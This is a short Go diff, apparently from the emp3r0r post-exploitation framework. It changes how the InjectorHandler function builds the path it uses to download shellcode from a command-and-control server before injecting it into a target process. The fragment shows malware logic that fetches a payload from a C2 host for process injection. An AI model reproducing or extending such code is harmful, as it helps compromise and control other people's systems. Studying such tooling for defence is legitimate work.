@@ -332,7 +332,7 @@ func prepare_guardian_sc(pid int) (shellcode string, err error) {
 func InjectorHandler(pid int, method string) (err error) {
 	// prepare the shellcode
 	prepare_sc := func() (shellcode string, shellcodeLen int) {
-		sc, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/shellcode.txt", "")
+		sc, err := DownloadViaCC("shellcode.txt", "")
 
 		if err != nil {
 			log.Printf("Failed to download shellcode.txt from CC: %v", err)
